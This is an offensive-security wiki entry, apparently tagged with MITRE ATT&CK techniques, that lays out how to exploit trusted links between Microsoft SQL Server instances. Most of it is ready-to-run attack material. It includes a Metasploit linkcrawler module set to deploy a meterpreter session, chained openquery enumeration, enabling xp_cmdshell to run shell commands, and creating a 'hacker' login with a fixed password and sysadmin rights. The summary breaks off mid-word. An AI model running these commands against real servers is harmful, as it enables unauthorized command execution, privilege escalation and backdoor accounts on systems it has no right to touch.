---
id: 3925bac8-dac5-4a9f-9a30-ffe488b1221e
name: MSSQL Trusted Links Exploitation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:34.116795+00:00'
updated_at: '2023-04-10T20:22:42.417120+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Trusted Relationship|T1199 - Trusted Relationship]]'
tags:
- '[[MSSQL Injection]]'
- '[[MSSQL Trusted Links]]'
commands:
- '[[Chain multiple openquery]]'
- '[[Create user and give admin privileges]]'
- '[[Execute query through the link]]'
- '[[Execute shell commands]]'
- '[[Exploit Windows MSSQL Linkcrawler]]'
- '[[Find link]]'
---

# MSSQL Trusted Links Exploitation

## Summary

MSSQL Trusted Links Exploitation is a technique used by attackers to gain access to a target's network through a trusted relationship between MSSQL servers. Attackers can use this technique to move laterally within the network, escalate privileges, and exfiltrate sensitive data. This technique invo

## Description

# Description

MSSQL Trusted Links Exploitation is a technique used by attackers to gain access to a target's network through a trusted relationship between MSSQL servers. Attackers can use this technique to move laterally within the network, escalate privileges, and exfiltrate sensitive data. This technique involves exploiting the trust relationship between two MSSQL servers by exploiting the linked servers feature. By leveraging the linked servers, attackers can execute arbitrary SQL commands on the target server and gain access to sensitive information.

## Requirements

1. Access to an MSSQL server with linked servers enabled

1. Knowledge of SQL injection techniques

1. Knowledge of MSSQL server configuration

## Defense

1. Disable linked servers if they are not needed

1. Implement least privilege access control on linked servers

1. Regularly monitor and audit MSSQL server logs for suspicious activity

## Objectives

1. Gain access to the target network

1. Move laterally within the network

1. Escalate privileges

1. Exfiltrate sensitive data

# Instructions

1. This command is used to exploit a vulnerability in Microsoft SQL Server. The exploit targets the 'link crawler' feature in the server, which is used to discover linked servers. The 'DEPLOY' option can be set to true to abuse the privileges and obtain a meterpreter session.

**Code**: [[msf> use exploit/windows/mssql/mssql_linkcrawler
[]]

> The 'use' command is used to select the exploit module to use. In this case, the module selected is 'exploit/windows/mssql/mssql_linkcrawler'. The 'set' command is used to set options for the selected module. The 'DEPLOY' option is set to true to exploit the vulnerability. Once the exploit is successful, a meterpreter session can be obtained.

**Command** ([[Exploit Windows MSSQL Linkcrawler]]):

```bash
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```

2. The above SQL code demonstrates how to exploit linked servers and escalate privileges. The code shows how to find and execute queries through linked servers, chain multiple openquery, execute shell commands, and create a user with admin privileges.

**Code**: [[-- find link
select * from master..sysservers

-- ]]

> The 'select * from master..sysservers' command is used to find linked servers. 'select * from openquery' is used to execute queries through the linked servers. 'EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer' is used to execute shell commands. 'EXECUTE('CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"' is used to create a login named 'hacker' with password 'P@ssword123.' on 'DOMINIO\SERVER1'. 'EXECUTE('sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"' is used to add the 'hacker' login to the sysadmin role on 'DOMINIO\SERVER1'.

**Command** ([[Find link]]):

```bash
select * from master..sysservers
```

**Command** ([[Execute query through the link]]):

```bash
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');
```

**Command** ([[Chain multiple openquery]]):

```bash
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
```

**Command** ([[Execute shell commands]]):

```bash
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
```

**Command** ([[Create user and give admin privileges]]):

```bash
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Trusted Relationship|T1199 - Trusted Relationship]]

## Commands Used

- [[Chain multiple openquery]]
- [[Create user and give admin privileges]]
- [[Execute query through the link]]
- [[Execute shell commands]]
- [[Exploit Windows MSSQL Linkcrawler]]
- [[Find link]]

## Tags

- [[MSSQL Injection]]
- [[MSSQL Trusted Links]]
